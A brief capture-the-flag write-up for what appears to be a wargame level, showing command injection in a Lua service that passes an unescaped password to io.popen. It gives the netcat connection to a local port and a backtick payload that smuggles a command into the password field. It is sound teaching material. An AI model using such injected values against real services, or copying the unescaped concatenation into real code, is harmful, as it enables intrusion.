# Level 11

Another command injection, this time in Lua service.

It does:

```lua
io.popen("echo " .. pass .. " | sha1sum", "r")
```

No escaping on pass.

Connect:

```bash
nc 127.0.0.1 5151
```

Send payload:

```text
Password: `getflag` > /tmp/flag11.txt
```

Then read:

```bash
cat /tmp/flag11.txt
```

Same pattern as before: user input concatenated into shell command.
